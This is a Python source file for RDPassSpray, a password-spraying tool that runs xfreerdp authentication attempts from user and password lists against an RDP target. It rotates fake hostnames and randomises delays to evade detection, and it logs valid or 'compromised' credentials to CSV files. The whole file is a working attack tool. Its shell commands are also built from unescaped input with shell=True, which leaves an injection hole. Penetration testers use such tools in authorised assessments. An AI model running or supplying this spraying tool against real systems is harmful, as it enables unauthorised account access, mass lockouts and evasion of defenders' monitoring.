# Based on the research and POC made by Beau Bullock (@dafthack),
# https://github.com/dafthack/RDPSpray This version was written by @x_Freed0m tested with Kali
# linux against 2012 DC escape chars in password with \ - e.g P\@ssword\!\#


import argparse
import csv
import datetime
import logging
import socket
import subprocess
import sys
import time
from random import randint
from select import select
from colorlog import ColoredFormatter

LOGGER = None


def args_parse():
    parser = argparse.ArgumentParser()
    pass_group = parser.add_mutually_exclusive_group(required=True)
    user_group = parser.add_mutually_exclusive_group(required=True)
    sleep_group = parser.add_mutually_exclusive_group(required=False)
    user_group.add_argument('-U', '--userlist', help="Users list to use, one user per line")
    user_group.add_argument('-u', '--user', help="Single user to use")
    pass_group.add_argument('-p', '--password', help="Single password to use")
    pass_group.add_argument('-P', '--passwordlist',
                            help="Password list to use, one password per line")
    sleep_group.add_argument('-s', '--sleep', type=int,
                        help="Throttle the attempts to one attempt every # seconds, "
                             "can be randomized by passing the value 'random' - default is 0",
                        default=0)
    sleep_group.add_argument('-r', '--random', nargs=2, type=int, metavar=(
                            'minimum_sleep', 'maximum_sleep'), help="Randomize the "
                            "time between each authentication attempt. Please provide "
                            "minimun and maximum values in seconds")
    parser.add_argument('-d', '--domain', help="Domain name to use")
    parser.add_argument('-n', '--names',
                        help="Hostnames list to use as the source hostnames, one per line")
    parser.add_argument('-t', '--target', help="Target machine to authenticate against",
                        required=True)
    parser.add_argument('-o', '--output', help="Output each attempt result to a csv file",
                        default="RDPassSpray")

    parser.add_argument('-V', '--verbose', help="Turn on verbosity to print failed "
                        "attempts", action="store_true", default=False)
    return parser.parse_args()


def configure_logger(verbose):  # This function is responsible to configure logging object.

    global LOGGER
    LOGGER = logging.getLogger("RDPassSpray")
    # Set logging level
    try:
        if verbose:
            LOGGER.setLevel(logging.DEBUG)
        else:
            LOGGER.setLevel(logging.INFO)
    except Exception as logger_err:
        exception(logger_err)

    # Create console handler
    log_colors = {
        'DEBUG': 'bold_red',
        'INFO': 'green',
        'WARNING': 'yellow',
        'ERROR': 'red',
        'CRITICAL': 'red',
    }
    formatter = "%(log_color)s[%(asctime)s] - %(message)s%(reset)s"
    formatter = ColoredFormatter(formatter, datefmt='%d-%m-%Y %H:%M', log_colors=log_colors)
    ch = logging.StreamHandler(sys.stdout)
    ch.setFormatter(formatter)
    LOGGER.addHandler(ch)

    # Create log-file handler
    log_filename = "RDPassSpray." + datetime.datetime.now().strftime('%d-%m-%Y') + '.log'
    fh = logging.FileHandler(filename=log_filename, mode='a')
    fh.setLevel(logging.DEBUG)
    fh.setFormatter(formatter)
    LOGGER.addHandler(fh)


def orig_hostname():  # saving the original hostname to revert to
    global orighostname
    orighostname = socket.gethostname()
    return orighostname


def exception(incoming_err):
    LOGGER.critical("[!] Exception: " + str(incoming_err))
    LOGGER.info('[*] Resetting to the original hostname')
    subprocess.call("hostnamectl set-hostname '%s'" % orighostname, shell=True)
    exit(1)


def userlist(incoming_userlist):
    with open(incoming_userlist) as f:
        usernames = f.readlines()
    generated_usernames_stripped = [incoming_userlist.strip() for incoming_userlist in usernames]
    return generated_usernames_stripped


def passwordlist(incoming_passwordlist):
    with open(incoming_passwordlist) as pass_obj:
        return [p.strip() for p in pass_obj.readlines()]


def fake_hostnames(hostnames_list):
    with open(hostnames_list) as f:
        hostnames = f.readlines()
    fake_hostnames_stripped = [hostname.strip() for hostname in hostnames]
    generated_hostname_counter = 0
    hostname_looper = len(fake_hostnames_stripped) - 1
    return fake_hostnames_stripped, generated_hostname_counter, hostname_looper


def output(status, username, password, output_file_name):
    try:
        with open(output_file_name + ".csv", mode='a') as log_file:
            creds_writer = csv.writer(log_file, delimiter=',', quotechar='"')
            creds_writer.writerow([status, username, password])
    except Exception as output_err:
        exception(output_err)


def locked_input(question, possible_answer, default_ans, timeout=5):  # asking the user if to
    # proceed when a locked user is identified, to prevent further lockouts
    LOGGER.warning('%s(%s):' % (question, possible_answer))
    rlist, _, _ = select([sys.stdin], [], [], timeout)
    if rlist:
        return sys.stdin.readline().strip()
    return default_ans


def attempts(users, passes, target, domain, output_file_name, hostnames_stripped, sleep_time,
             hostname_loop, random, min_sleep, max_sleep):

    # freerdp response status codes:
    # failed_login = b"ERRCONNECT_LOGON_FAILURE [0x00020014]"
    # access_denied = b"ERRCONNECT_AUTHENTICATION_FAILED [0x00020009]"
    # success_login_no_rdp = b"ERRCONNECT_CONNECT_TRANSPORT_FAILED [0x0002000D]"
    # success_login_no_rdp2 = b"ERRINFO_SERVER_INSUFFICIENT_PRIVILEGES (0x00000009)"
    # pass_expired = b"ERRCONNECT_PASSWORD_EXPIRED [0x0002000E]"
    # pass_expired2 = b"ERRCONNECT_PASSWORD_CERTAINLY_EXPIRED [0x0002000F]"
    # pass_expired3 = b"ERRCONNECT_PASSWORD_MUST_CHANGE [0x00020013]"

    success_login_yes_rdp = b"Authentication only, exit status 0"
    account_locked = b"ERRCONNECT_ACCOUNT_LOCKED_OUT"
    account_disabled = b"ERRCONNECT_ACCOUNT_DISABLED [0x00020012]"
    account_expired = b"ERRCONNECT_ACCOUNT_EXPIRED [0x00020019]"
    success_login_no_rdp = [b'0x0002000D', b'0x00000009']
    failed_to_conn_to_server = [b'0x0002000C', b'0x00020006']
    pass_expired = [b'0x0002000E', b'0x0002000F', b'0x00020013']
    failed_login = [b'0x00020009', b'0x00020014']

    attempts_hostname_counter = 0
    working_creds_counter = 0

    try:
        LOGGER.info(
            "[*] Started running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
        output('Status', 'Username', 'Password', output_file_name)
        for password in passes:
            for username in users:
                subprocess.call(
                    "hostnamectl set-hostname '%s'" % hostnames_stripped[attempts_hostname_counter],
                    shell=True)
                spray = subprocess.Popen(
                    "xfreerdp /v:'%s' +auth-only /d:%s /u:%s /p:%s /sec:nla /cert-ignore" % (
                        target, domain, username, password), stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE, shell=True)
                output_error = spray.stderr.read()
                output_info = spray.stdout.read()
                # throttling requests
                if random is True:
                    sleep_time = random_time(min_sleep, max_sleep)
                    time.sleep(float(sleep_time))
                else:
                    time.sleep(float(sleep_time))
                if any(word in output_error for word in failed_to_conn_to_server):
                    LOGGER.error(
                        "[-] Failed to establish connection, check target RDP availability.")
                    LOGGER.info('[*] Resetting to the original hostname')
                    subprocess.call("hostnamectl set-hostname '%s'" % orighostname, shell=True)
                    exit(1)
                elif any(word in output_error for word in failed_login):
                    status = 'Invalid'
                    output(status, username, password, output_file_name)
                    LOGGER.debug("[-]Creds failed for: " + username)
                elif account_locked in output_error:
                    status = 'Locked'
                    output(status, username, password, output_file_name)
                    LOGGER.warning("[!] Account locked: " + username)
                    answer = locked_input('%s is Locked, do you wish to resume? (will '
                                          'auto-continue without answer)' % username, 'Y/n',
                                          'y').lower()
                    if answer == 'n':
                        LOGGER.error("Stopping the tool")
                        LOGGER.info('[*] Resetting to the original hostname')
                        subprocess.call("hostnamectl set-hostname '%s'" % orighostname, shell=True)
                        exit(1)
                elif account_disabled in output_error:
                    status = 'Disabled'
                    output(status, username, password, output_file_name)
                    working_creds_counter += 1
                    LOGGER.warning(
                        "[*] Creds valid, but account disabled: " + username + " :: " + password)
                elif any(word in output_error for word in pass_expired):
                    status = 'Password Expired'
                    output(status, username, password, output_file_name)
                    working_creds_counter += 1
                    LOGGER.warning(
                        "[*] Creds valid, but pass expired: " + username + " :: " + password)
                elif account_expired in output_error:
                    status = 'Account expired'
                    output(status, username, password, output_file_name)
                    working_creds_counter += 1
                    LOGGER.warning(
                        "[*] Creds valid, but account expired: " + username + " :: " + password)
                elif any(word in output_error for word in success_login_no_rdp):
                    status = 'Valid creds WITHOUT RDP access'
                    output(status, username, password, output_file_name)
                    working_creds_counter += 1
                    LOGGER.info(
                        "[+] Seems like the creds are valid, but no RDP permissions: " + username
                        + " :: " + password)
                elif success_login_yes_rdp in output_error:
                    status = 'Valid creds WITH RDP access (maybe even local admin!)'
                    output(status, username, password, output_file_name)
                    working_creds_counter += 1
                    LOGGER.info(
                        "[+] Cred successful (maybe even Admin access!): " + username + " :: " +
                        password)
                else:
                    status = 'Unknown status, check the log file'
                    output(status, username, password, output_file_name)
                    with open(output_file_name + ".log", mode='a') as log_file2:
                        creds_writer = csv.writer(log_file2, delimiter=',', quotechar='"')
                        creds_writer.writerow(
                            ['Unknown status, check the csv file', username,
                             output_error + output_info])
                    LOGGER.error("[-]Unknown error for %s: %s %s", username, output_error,
                                 str(output_info))

                if attempts_hostname_counter < hostname_loop:  # going over different fake hostnames
                    attempts_hostname_counter += 1
                else:
                    attempts_hostname_counter = 0

        LOGGER.info("[*] Overall compromised accounts: %s" % working_creds_counter)
        LOGGER.info(
            "[*] Finished running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
        subprocess.call("hostnamectl set-hostname '%s'" % orighostname, shell=True)

    except Exception as attempt_err:
        exception(attempt_err)

    except KeyboardInterrupt:
        LOGGER.critical("[!] [CTRL+C] Stopping the tool")
        LOGGER.info('[*] Resetting to the original hostname')
        subprocess.call("hostnamectl set-hostname '%s'" % orighostname, shell=True)
        exit(1)


def apt_get_xfreerdp():
    try:
        ver = subprocess.Popen("xfreerdp /version", stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               shell=True)
        xfreerdp_version_output = ver.stdout.read()
        if b'This is FreeRDP ' in xfreerdp_version_output:
            return 0
        else:
            LOGGER.error("[-] xfreerdp wasn't identified. please run 'apt-get install xfreerdp'")
            sys.exit(1)
    except Exception as xfreerdp_err:
        exception(xfreerdp_err)
    except KeyboardInterrupt:
        LOGGER.critical(" [CTRL+C] Stopping the tool")
        LOGGER.info('[*] Resetting to the original hostname')
        subprocess.call("hostnamectl set-hostname '%s'" % orighostname, shell=True)
        exit(1)


def random_time(minimum, maximum):
    sleep_amount = randint(minimum, maximum)
    return sleep_amount


def logo():
    """
    ######  ######  ######                        #####
    #     # #     # #     #   ##    ####   ####  #     # #####  #####    ##   #   #
    #     # #     # #     #  #  #  #      #      #       #    # #    #  #  #   # #
    ######  #     # ######  #    #  ####   ####   #####  #    # #    # #    #   #
    #   #   #     # #       ######      #      #       # #####  #####  ######   #
    #    #  #     # #       #    # #    # #    # #     # #      #   #  #    #   #
    #     # ######  #       #    #  ####   ####   #####  #      #    # #    #   #
    \n
    By @x_Freed0m
    """


def main():
    logo()
    random = False
    min_sleep, max_sleep = 0, 0
    usernames_stripped, passwords_stripped = [], []
    args = args_parse()
    orig_hostname()
    apt_get_xfreerdp()
    configure_logger(args.verbose)

    if args.userlist:
        try:
            usernames_stripped = userlist(args.userlist)
        except Exception as err:
            exception(err)
    elif args.user:
        try:
            usernames_stripped = [args.user]
        except Exception as err:
            exception(err)
    if args.password:
        try:
            passwords_stripped = [args.password]
        except Exception as err:
            exception(err)
    elif args.passwordlist:
        try:
            passwords_stripped = passwordlist(args.passwordlist)
        except Exception as err:
            exception(err)
    if args.random:
        random = True
        min_sleep = args.random[0]
        max_sleep = args.random[1]
    if args.names:
        hostnames_stripped = []
        try:
            hostnames_stripped, k, hostname_loop = fake_hostnames(args.names)
        except Exception as err:
            exception(err)
    else:
        hostnames_stripped = orig_hostname()

    hostname_loop = len(hostnames_stripped) - 1
    total_accounts = len(usernames_stripped)
    total_passwords = len(passwords_stripped)
    total_attempts = total_accounts * total_passwords
    LOGGER.info("Total number of users to test: " + str(total_accounts))
    LOGGER.info("Total number of password to test: " + str(total_passwords))
    LOGGER.info("Total number of attempts: " + str(total_attempts))

    attempts(usernames_stripped, passwords_stripped, args.target, args.domain,  args.output,
             hostnames_stripped, args.sleep, hostname_loop, random, min_sleep, max_sleep)


if __name__ == '__main__':
    main()

# TODO: replace shell commands with better alternative
# TODO: get more status codes
# TODO: maybe add threads for speed?
# TODO: check ability to support hash instead of password
